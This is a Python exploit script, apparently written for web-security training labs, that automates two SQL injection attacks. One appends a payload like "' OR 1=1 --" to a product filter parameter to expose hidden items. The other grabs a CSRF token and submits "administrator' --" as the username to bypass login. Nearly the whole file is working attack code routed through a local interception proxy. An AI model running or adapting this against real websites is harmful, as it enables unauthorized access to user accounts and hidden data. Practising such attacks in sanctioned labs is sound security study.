import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import signal
#import argparse
#import textwrap

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080' }


def run_exploit(args):
    args = sys.argv[2:]
    exploit_type = sys.argv[1]
    if exploit_type == 'wc':
        try:
            url, path_qparams, payload, visible, var_to_count = sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5], sys.argv[6]
        # If it doesn't have the 5 parameters, we print an error.
        except IndexError:
            print("[-] Usage: %s <exploit_type> <url> <path_qparams> <payload> <visible> <var_to_count>" % sys.argv[0])
            print('[-] Example: python3 %s wc https://website.net "/filter?category=" "\' OR 1=1 --" 12 productId=' % sys.argv[0])
            sys.exit(-1)
        #for a in args:
            #print('WC exploit choose: ', a)
        #where_clause(url, payload, visible, var_to_count)
        where_clause = WhereClause.exploit_sqli(url, path_qparams, payload, visible, var_to_count)
        
    elif exploit_type == 'lb':
        try:
            url, payload, text = sys.argv[2], sys.argv[3], sys.argv[4]
            sess = requests.Session()
        except IndexError as error:
            print(f"Error: {error}")
            print('[-] Usage: %s <exploit_type> <url> <sql-payload> <text-to-search>' % sys.argv[0])
            print('[-] Example: python3 %s lb "https://website.net/login" "administrator\' --" "Log out"' % sys.argv[0])
        #for a in args:
            #print('LB exploit choose: ', a)
        login_bypass = LoginBypass(sess, url, payload, text)
        login_bypass.exploit_sqli(sess, url, payload, text)
    else:
        raise ValueError('Sorry man, this {} exploit type doesn\'t exist: '.format(exploit_type))


class WhereClause():
    def __init__(self, url, payload, visible, var_to_count) -> None:
        self.url = url,
        self.payload = payload,
        self.vislble = visible,
        self.var_to_count = var_to_count
        
        
    def exploit_sqli(url, path_qparams, payload, visible, var_to_count):
        #print('WhereClause Exploit: ', url, payload, visible, var_to_count)
        uri = '/filter?category='
        #req = requests.get(url + uri + payload, verify=False, proxies=proxies)
        req = requests.get(url + path_qparams + payload, verify=False, proxies=proxies)
        # Check if the response code has an unreleased item that is not public.
        html = req.text
        # Check how many products are loaded in HTML by counting items.
        # Example string: productId=
        numProducts = html.count(var_to_count)
        # Use 'if numProducts == 20' if you know the amount or 'if numProducts > 12'
        # if you only know what is visible.
        vis = int(visible)
        if numProducts > vis:
            print("[+] SQL injection successful...")
            print(f"[+] There are {numProducts - vis} hidden items.")
        else:
            print("[-] SQL injection unsuccessful...")
 
  
class LoginBypass():
    def __init__(self, sess, url, payload, text) -> None:
        self.sess = sess,
        self.url = url,
        self.payload = payload,
        self.text = text
  
  
    def get_csrf_token(self, sess, url):
        #print(sys.argv[2], sys.argv[3], sys.argv[4])
        try:
            req = sess.get(url, verify=False, proxies=proxies)
            # Check the HTML to see where to parse the CSRF from.
            beau_soup = BeautifulSoup(req.text, 'html.parser')
            # Find the first input element and get its value.
            csrf = beau_soup.find("input")['value']
            return csrf
        except Exception as e:
            template = "An exception of type {0} occurred. Arguments:\n{1!r}"
            message = template.format(type(e).__name__, e.args)     
            if type(e).__name__ == 'ProxyError':
                print("Error Type: ProxyError. Check the proxy.")
            else:    
                print('CSRF Error Return Type: ', message)
  
  
    def exploit_sqli(self, sess, url, payload, text):
        # Use Session to make certain parameters persistant accross the session.
        # You don't want to send a new request every time in this case.
        # For example, we will need the cookie to stay the same.
        sess = requests.Session()
        csrf = self.get_csrf_token(sess, url)
        # Data needed for the exploit.
        data = {"csrf": csrf, "username": payload, "password": "anything"}
        # Send a POST request.
        try:
            req = sess.post(url, data=data, verify=False, proxies=proxies)
            # Check if the request logged in by looking in the response text.
            # If true, it means the exploit worked as intended.
            res = req.text
            if text in res:
                print('[+] SQL injection successful. You we\'re logged in.')
            else:
                print('[-] SQL injection unsuccessful.')
        except Exception as e:
            print('SQLi Error Return Type: ', type(e))
                

def signal_handler(sig, frame):
    print("\n[+] Exploit aborted with Ctrl-c.")
    # Run any clean up commands here.
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)

if __name__ == "__main__":
    try:
        args = sys.argv[1:]
        run_exploit(args)
    except IndexError:
        print("[-] Usage: python3 %s wc " % sys.argv[0])
        print("wc = Where Clause")
        print("lb = Login Bypass")